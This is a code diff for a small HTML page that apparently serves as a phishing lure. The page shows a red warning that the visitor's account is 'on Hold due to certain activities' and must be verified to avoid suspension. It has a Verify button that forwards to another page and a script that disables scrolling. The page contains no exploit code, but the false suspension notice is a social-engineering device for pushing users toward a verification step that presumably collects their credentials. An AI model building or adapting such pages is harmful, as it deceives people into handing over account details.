@@ -1,26 +1,39 @@
+<!DOCTYPE html>
 <html>
-    <head>
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=disable, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-            
-            
-    </head>
-    <title> Test</title>
-    <body>
-        <script>
-            // To disable scrolling
-            document.body.style.overflow = 'hidden';
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        /* Add CSS styles for the red text box */
+        .red-box {
+            background-color: rgba(255, 0, 0, 0.3);
+            border: 2px solid red;
+            border-radius: 10px;
+            padding: 10px;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <button id="verifyButton">Verify</button>
     
-            // To re-enable scrolling
-            // document.body.style.overflow = 'auto';
-        </script>
+    <div class="red-box">
+        <p>NOTICE: Your account is on Hold due to certain activities. Please Verify to prevent your account from being suspended.</p>
+    </div>
 
-        <div data-dom-node="true" class="NodeRendererstyles__Container-sc-ocng4r-0 hUiLQk" bis_skin_checked="1" style="top: 526px; left: 83px; width: 210px; height: 36px; z-index: 19;"><div bis_skin_checked="1" style="display: flex; align-items: center; justify-content: center; box-sizing: border-box; overflow: hidden; outline: none; cursor: inherit; width: 210px; height: 36px; opacity: 1; background-color: rgb(49, 100, 244); border-radius: 10px; box-shadow: rgba(3, 3, 3, 0.1) 0px 0px 10px; border: 0px;"><span style="display: flex; align-items: center; flex-direction: row; padding: 0px 8px; z-index: 1;"><div bis_skin_checked="1" style="flex-grow: 1; margin: 0px; overflow: visible; font-size: 14px; text-transform: none; text-align: center; letter-spacing: 0px; line-height: 16px; white-space: nowrap; opacity: unset; visibility: visible; color: rgb(255, 255, 255); font-family: Roboto;">Verify</div></span></div></div>
+    <script>
+        // To disable scrolling
+        document.body.style.overflow = 'hidden';
 
+        // To re-enable scrolling
+        // document.body.style.overflow = 'auto';
 
-    </body>
-
+        // Add functionality to the "Verify" button to open index.html
+        const verifyButton = document.getElementById('verifyButton');
+        verifyButton.addEventListener('click', function() {
+            // Replace 'index.html' with the actual URL you want to open
+            window.location.href = 'index.html';
+        });
+    </script>
+</body>
 </html>
-
-
